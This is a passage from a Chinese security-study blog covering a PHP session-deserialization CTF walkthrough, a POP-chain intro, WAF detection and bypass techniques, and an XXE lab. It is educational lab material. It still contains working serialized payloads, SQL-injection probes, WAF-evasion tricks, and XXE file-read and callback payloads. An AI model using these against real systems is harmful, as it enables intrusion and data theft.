src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417164402.png"></p><p>而此时的session文件中，储存的内容变成了</p><p><code>a:1:&#123;s:7:&quot;session&quot;;s:38:&quot;|O:5:&quot;sayhi&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;pig&quot;;&#125;&quot;;&#125;</code></p><p><code>|</code>后的字符串即为我们构造的sayhi类的序列化后的字符串。</p><p><strong>这样，当执行session_start()时，此时PHP对session文件进行反序化操作。而该文件被运算符|分割，这使得我们构造的sayhi类也反序列化了</strong></p><p>此时访问<code>a.php</code>，打印出了“how are you?”，证明我们使sayhi类反序列化成功，触发了sayhi的魔术方法<code>__wakeup()</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417164913.png"></p><p><em>因为生成了两个sayhi类，程序结束后<code>__destruct()</code>也触发了两次</em></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>来看看一道来自来自习题爱抚的PHP session反序列化例题</p><p>题目地址：<a href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a></p><p><em>好神奇，没想到等我找到这个地址时还能用，说不定等你来看的时候也还能用…</em></p><p><em>本来我是想本地环境复现的，因为有这个PHP源码，write up 中也提到了php.ini需要更改2条项相关配置…不过最开始我没有复现成功，等我对比phpinfo信息时才发现是需要更改3条配置信息🥴</em> <em>修改之后本地就能成功复现了</em></p><p>tmp.php</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//A webshell is wait for you</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> OowoO();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    highlight_string(file_get_contents(<span class="hljs-string">&#x27;tmp.php&#x27;</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>从源码上看，我们的目标应该是想办法去执行__destruct()中的eval()函数。在此之前，我们可以先传参数phpinfo来看看一些信息。</p><p>(因为需要满足靶场条件，这里是我去php.ini修改的)</p><p>PHP版本：7.3.4  其它相关设置：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417193717.png"></p><p>满足以上框里 的<strong>三条</strong>设置我们就可以开始了。（第二个框里的参数前面没提到，接下来会进行解释）</p><p>根据前面的学习，我们的大致思路如下：构造一个OowoO类，new一个对象使其属性<code>mdzz</code>为我们想要执行的命令，然后序列化该对象并在前面加<code>|</code>，把该值上传到$_SESSION中去。再次访问tmp.php时，session_start()，使我们上传的对象反序列化，执行eval()函数。</p><p>但这里并没有给我们上传$_SESSION的条件，我们只有先放一下，把前面能做的事先完成。</p><p>先构造payload，因为类的方法不影响序列化的生成，所以只保留属性名即可</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417185331.png"></p><p>加上<code>|</code>得到需要上传的字符串<code>|O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(__FILE__));&quot;;&#125;</code></p><p>不过此题没有可以传入session的点，那么我们怎么改变或传入session呢？写入的方式是利用PHP中Session Upload Progress。</p><blockquote><p>PHP手册<br>Session 上传进度<br>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态<br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</p></blockquote><p>总之<code>session.upload_progress.cleanup</code>和<code>session.upload_progress.enabled</code>满足条件时，就可以通过POST方法来构造数据传入<code>$_SESSION</code><br>构造POST提交表单</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1/tmp.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>访问该页面，抓包，修改filename为我们构造的payload，注意添加<code>\</code>转义</p><p><code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:27:\&quot;print_r(dirname(__FILE__));\&quot;;&#125;</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417194154.png"></p><p>成功触发了我们构造的函数。在CTF中接下来的步骤就是继续构造payload来读文件找flag了，漏洞原理一样的，不再赘述。</p><p>记录一下总共用到的PHP函数分别为</p><p><code>print_r(dirname(__FILE__));</code> 打印当前文件路径</p><p><code>print_r(scandir(dirname(__FILE__)));</code> 打印大气文件目录结构</p><p><code>print_r(file_get_contents());</code> 读取文件内容</p><p>以上就是PHP session反序化相关的内容了，要是觉得意犹未尽，这里还有一个稍微复杂一点的吸体爱抚的例题：<a href="https://xz.aliyun.com/t/6640#toc-10">https://xz.aliyun.com/t/6640#toc-10</a></p><h3 id="0x04-施工中！-POP链构造"><a href="#0x04-施工中！-POP链构造" class="headerlink" title="0x04   施工中！ POP链构造"></a>0x04   <strong>施工中！</strong> POP链构造</h3><h4 id="POP与POP链"><a href="#POP与POP链" class="headerlink" title="POP与POP链"></a>POP与POP链</h4><p>笼统来讲，POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者恶意利用的目的。</p><p>说的再具体一点反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。</p><p>也可以这样理解，构造一条完整的调用链，这条调用链与原来代码的调用链一致，不过部分属性被我们所控制，从而达到攻击目的。构造的这条链就是POP链。</p><p>为什么需要利用pop链呢，</p><p><strong>先前的序列化攻击，更多的是在魔术方法中出现一些利用的漏洞，因为自动调用从而触发漏洞。<br>但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</strong></p><h4 id="POP链代码实现"><a href="#POP链代码实现" class="headerlink" title="POP链代码实现"></a>POP链代码实现</h4><p>现有a.php</p><p><em>源码来自<a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html">https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</a></em></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lemon</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ClassObj</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;ClassObj = <span class="hljs-keyword">new</span> normal();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;ClassObj-&gt;action();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">normal</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;data);<br>    &#125;<br>&#125;<br><br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p>从该代码可以看出，在我们传入的参数是类<code>lemon</code>的序列化字符串时，反序列化操作，</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/3674">https://xz.aliyun.com/t/3674</a></p><p><a href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/13742666.html">https://www.cnblogs.com/bmjoker/p/13742666.html</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html">https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</a></p><p><a href="https://as1def.github.io/2020/10/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE%E6%9E%84%E9%80%A0/">https://as1def.github.io/2020/10/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE%E6%9E%84%E9%80%A0/</a></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前人栽树</title>
    <link href="/2022/04/16/%E5%89%8D%E4%BA%BA%E6%A0%BD%E6%A0%91/"/>
    <url>/2022/04/16/%E5%89%8D%E4%BA%BA%E6%A0%BD%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>传承🤣</p><span id="more"></span><hr><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220416140835.png"></p><hr><p><em>发条博客掩饰自己最近效率低下这回事…实际上是因为事情太多了。。</em></p><p><em>少即是多，慢即是快</em></p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>好笑</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WAF介绍</title>
    <link href="/2022/04/12/WAF%E4%BB%8B%E7%BB%8D/"/>
    <url>/2022/04/12/WAF%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<p>来认识一下WAF</p><span id="more"></span><hr><h3 id="WAF是什么"><a href="#WAF是什么" class="headerlink" title="WAF是什么"></a>WAF是什么</h3><p>WAF的全称是（Web Application Firewall）即<strong>Web应用防火墙</strong>，简称WAF。</p><p>国际上公认的一种说法是：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20200614103314459.jpg"></p><h3 id="WAF分类"><a href="#WAF分类" class="headerlink" title="WAF分类"></a>WAF分类</h3><ul><li><p>软件型</p><p>以软件形式装在所保护的服务器上的WAF，由于安装在服务器上，所以可以直接接触到服务器上的文件，直接检测服务器上是否存在Webshell，是否有文件被创建等。特点是安装简单，容易使用，成本低。但它的缺点也是显而易见的，因为它必须安装在Web应用服务器上，除了性能受到限制外，还可能会存在兼容性、安全等问题。这类WAF的代表有ModSecurity、Naxsi、网站安全狗等。</p></li><li><p>硬件型</p><p>以硬件形式部署到链路中，支持多种部署方式（如透明桥接模式、旁路模式、反向代理等)，当串联到链路中时可以拦截恶意流量，在旁路监听模式时至记录攻击不拦截。这类产品的优点是性能好、功能全面、支持多种模式部署等，但它的价格通常比较贵。国内的绿盟、安恒、启明星辰等厂商生产的WAF都属于此类。</p></li><li><p>云类型</p><p>一般以反向代理的形式工作，通过配置NS记录或CNAME记录，使对网站的请求报文优先经过WAF主机，经过WAF主机过滤后，将认为无害的请求报文再发送给实际网站服务器进行请求，可以说是带防护功能的CDN。它的优点是快速部署、零维护、成本低。对于中、小型的企业和个人站长是很有吸引力的。</p><blockquote><p>顺便补充一下这些网站基础名词的解释</p><p>反向代理、NS、CNAME：</p><p>反向代理</p><p>反向代理服务器位于用户与目标Web服务器之间。虽然用户请求的是目标服务器，但反向代理服务器可以代替目标服务器对用户进行响应。站在用户的角度上看，并没有反向代理服务器与目标服务器并无区别。</p><p>NS</p><p>NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。</p><p>CNAME</p><p>别名记录(CNAME)</p><p>也被称为规范名字。这种记录允许您将多个名字映射到同一台计算机。</p><p>所以说可通过配置这两个信息，使得用户访问站点时交给反向代理服务器处理。</p><p>CDN</p><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p><p>为什么提这一点呢，这是因为有时渗透别人网站时，我们也要判断提供服务的是目标主机，还是只是一个CDN服务器。</p></blockquote></li><li><p>网站系统内置的WAF</p><p>网站系统内置的WAF也可以说是网站系统内置的过滤，直接镶嵌在代码中，相对来说自由度高，一般有一下几种情况：</p><ul><li>输入参数合法性检测</li><li>输入参数强制类型转换</li><li>关键函数执行（sql执行、页面显示、命令执行等）前，对经过代码流程的输入进行检测</li><li>对输入的数据进行替换过滤（转义或替换特殊字符等）后再继续执行代码流程</li></ul><p>网站内置的WAF与业务更加契合，在对安全与业务都比较了解的情况下，可以更少得收到误报与漏报。</p></li></ul><h3 id="WAF工作原理"><a href="#WAF工作原理" class="headerlink" title="WAF工作原理"></a>WAF工作原理</h3><p>WAF通过一些规则识别入侵检测，重点即该怎么识别。WAF最大的挑战是怎么提高识别率，尽量避免误判与漏判。对于已知的攻击方式，还有机会识别，但是对于未知的攻击手段，WAF就检测不到了</p><h4 id="基于规则库匹配"><a href="#基于规则库匹配" class="headerlink" title="基于规则库匹配"></a>基于规则库匹配</h4><p>目前市面上大多数的WAF都是基于规则的WAF。即WAF对接收数据收到的包进行正则匹配过滤，如果正则匹配到与现有漏洞知识库的攻击代码相同，则进行阻断。所以，对于基于规则匹配的WAF，需要每天及时更新最新的漏洞库。</p><p>对于这种WAF，它的工作过程是这样的：预处理——&gt;匹配规则——&gt;防御动作——&gt;记录日志 </p><p>具体实现如下：</p><ul><li><p>预处理：</p><p>预处理阶段首先在接收到数据请求流量时会先判断是否为HTTP/HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。</p></li><li><p>匹配规则：</p><p> 规则检测模块，匹配规则库，检查该数据请求是否符合规则，识别出恶意攻击行为。</p></li><li><p> 防御动作：</p></li></ul><p>  return 403 或者跳转到自定义界面，或者不返回任何数据，或者拉黑IP。不同的WAF产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款WAF产品，从而有目的性的进行WAF绕过。</p><ul><li><p>日志记录：</p><p>WAF在处理的过程中也会将拦截处理的日志记下来，方便用户在后续中可以进行日志查看分析，</p></li></ul><h4 id="基于语义引擎分析"><a href="#基于语义引擎分析" class="headerlink" title="基于语义引擎分析"></a>基于语义引擎分析</h4><p>一般来说，规则引擎使用的正则规则的描述性比较强，对于强攻击的特征请求，正则规则的防护效果最佳。而当面对一些若特征的攻击请求（例XSS请求），就可能检测不到入侵。所以可以通过启用Web应用防火墙的大数据深度学习引擎功能，识别并拦截Web应用攻击防护的严格规则无法识别的弱特征攻击请求</p><h3 id="WAF判断"><a href="#WAF判断" class="headerlink" title="WAF判断"></a>WAF判断</h3><ul><li><p>sqlmap检测</p><p><code>python sqlmap.py -u &quot;https://www.xxx.com/&quot; --identify-waf --batch</code></p></li><li><p>手工检测</p><p>直接在url后面加上最基础的测试语句，比如<code>union select 1 2 3 %23</code>，随便放到一个不存在的参数里面执行。因为选取的是一个不存在的参数，所以实际上并不会对网站系统的执行流程造成任何影响，如果被拦截则说明存在WAF。书上的例子：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220412223300.png">增加了无影响的测试语句后，被拦截的表现为页面无法访问、响应码不同、返回与正常请求网页时不同的结果等。</p></li></ul><h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p>将payload进行URL编码，如果服务器系统中的web代码进行了额外的URL解码的话那么还可以进行二次编码。</p><h4 id="替换关键字-大小写"><a href="#替换关键字-大小写" class="headerlink" title="替换关键字/大小写"></a>替换关键字/大小写</h4><p>替换为空就双写/大小写混合</p><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>当WAF不能识别代码中的注释内容或者替换注释内容的话，那么我们就可以在payload中加上注释符，一般可用来绕过空格。如</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>换成<br><span class="hljs-keyword">union</span><span class="hljs-comment">/*123*/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/*123*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><br></code></pre></div></td></tr></table></figure><p>另外也可以用<code>+</code>和以下字符来绕过空格过滤</p><table><thead><tr><th>数据库类型</th><th>允许的空白符</th></tr></thead><tbody><tr><td>SQLite3</td><td>0A，0D，0C，09，20</td></tr><tr><td>MySQL5</td><td>09，0A，0B，0C，0D，A0，20</td></tr><tr><td>PosgresSQL</td><td>0A，0D，0C，09，20</td></tr><tr><td>Oracle 11g</td><td>00，0A，0D，0C，09，20</td></tr><tr><td>MSSQL</td><td>01，02，03，04，05，06，07，08，09，0A，0B，0C，0D，0E，0F，10，11，12，13，14，15，16，17，18，19，1A，1B，1C，1D，1E，1F，20</td></tr></tbody></table><h4 id="多参数请求拆分"><a href="#多参数请求拆分" class="headerlink" title="多参数请求拆分"></a>多参数请求拆分</h4><p>当请求中有多个参数时，如<code>a=[input1]&amp;b=[input2]</code>,可以这样拼接<code>a=union/*</code>,<code>b=a*/select 1,2,3,4</code>，最终得到的sql语句为<code>a=union/*and b=a*/select 1,2,3,4</code></p><h4 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h4><p>简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。比如说</p><p>我们在百度搜索<code>https://www.baidu.com/s?wd=eggs&amp;wd=帅哥</code></p><p>百度只会接收第一个参数</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220413092513.png"></p><p>在Google搜索<code>https://www.google.com/search?q=egg&amp;q=帅哥</code></p><p>Google就会将两个参数合在一起搜索</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220413092823.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220413093212.png"></p><p>这意味着，如果我们提交参数一样的值多次，如<code>id=7&amp;id=[SQLi]  </code>，有可能WAF只会处理某一个参数，而另一个参数未被WAF处理就直接被传递到了后端。</p><h4 id="使用生僻函数"><a href="#使用生僻函数" class="headerlink" title="使用生僻函数"></a>使用生僻函数</h4><p>用黑名单中没有的函数，如在报错注入中使用polygon()代替updatexml()</p><h4 id="查找网站源IP"><a href="#查找网站源IP" class="headerlink" title="查找网站源IP"></a>查找网站源IP</h4><p>对于云WAF防护的网站而言，我们直接访问它的IP而不是域名，就跳过DNS解析，从而绕过云WAF的检测。另外有时一个IP上搭建了多个站点的话（虚拟主或是反向代理，直接输入IP是访问不到的，因为服务器不知道你要访问哪个站点</p><h4 id="注入参数到cookie中"><a href="#注入参数到cookie中" class="headerlink" title="注入参数到cookie中"></a>注入参数到cookie中</h4><p>某些程序员在代码中使用$_REQUEST获取参数，而$_REQUEST会依次从GET、POST、cookie中获取参数，如果WAF只检测了GET、POST而没有检测cookie，可以将注入语句放入cookie中进行绕过。</p><h4 id="更改请求方法"><a href="#更改请求方法" class="headerlink" title="更改请求方法"></a>更改请求方法</h4><p>有些WAF只会检测GET、POST方法，我们可以在报文中随便命名一个不存在的方法，使请求绕过WAF检测。</p><p>超大数据包绕过</p><p>有些WAF只检测一定大小的数据内容，就可以通过添加无用字符进行绕过，如</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-keyword">and</span><span class="hljs-operator">+</span>sleep(<span class="hljs-number">3</span>)<span class="hljs-operator">+</span><span class="hljs-keyword">and</span><span class="hljs-operator">+</span><span class="hljs-number">111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span><span class="hljs-operator">=</span><span class="hljs-number">111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span><br></code></pre></div></td></tr></table></figure><hr><p>参考：</p><p><a href="https://xz.aliyun.com/t/7767#toc-5">https://xz.aliyun.com/t/7767#toc-5</a></p><p>《web安全攻防》</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WAF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE实验与靶场</title>
    <link href="/2022/04/05/xxe%E5%AE%9E%E9%AA%8C%E4%B8%8E%E9%9D%B6%E5%9C%BA/"/>
    <url>/2022/04/05/xxe%E5%AE%9E%E9%AA%8C%E4%B8%8E%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>我将在本篇中继续介绍xxe漏洞，并结合本地环境与WebGaot靶场中的xxe模块进行练习。</p><span id="more"></span><hr><h3 id="xxe漏洞检测"><a href="#xxe漏洞检测" class="headerlink" title="xxe漏洞检测"></a>xxe漏洞检测</h3><p>找到一个可以上传东西的地方，通常在我们上传数据后，我们并不知道服务器会不会把我们的数据当作xml格式解析，如果当作xml格式解析的话又有没有禁用外部实体引用。因此，我们采用如下payload来检测：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ENTITY test SYSTEM &#x27;http://yourserverip/&#x27;&gt;]&gt;<br>&lt;root&gt;&amp;test;&lt;/root&gt;<br></code></pre></div></td></tr></table></figure><p>这里定义了一个外部实体，xml解析器解析时会向我们的服务器IP发起一次请求。</p><p>这样的话如果payload生效，我们服务器的网络日志文件中有一个新的连接，那么就可以确认服务器解析了xml的外部实体，此处存在xxe漏洞。</p><hr><h3 id="实验环节"><a href="#实验环节" class="headerlink" title="实验环节"></a>实验环节</h3><h4 id="有回显的xxe注入"><a href="#有回显的xxe注入" class="headerlink" title="有回显的xxe注入"></a>有回显的xxe注入</h4><p>在这种情况下，外部实体包含在本地DTD中，这也是我上一篇博客中的实验形式</p><h5 id="读取普通文件"><a href="#读取普通文件" class="headerlink" title="读取普通文件"></a>读取普通文件</h5><p>本地php:</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    libxml_disable_entity_loader (<span class="hljs-literal">false</span>);<br>    <span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <br>    <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE creds [  <br>&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; <br>&lt;creds&gt;&amp;goodies;&lt;/creds&gt;<br></code></pre></div></td></tr></table></figure><p>结果：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220405143648.png"></p><p>攻击原理与思路：</p><p>1.该处可以提交XML类型数据类型</p><p>2.构造XML，<strong>其中的DTD引用外部实体。</strong><code>&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; 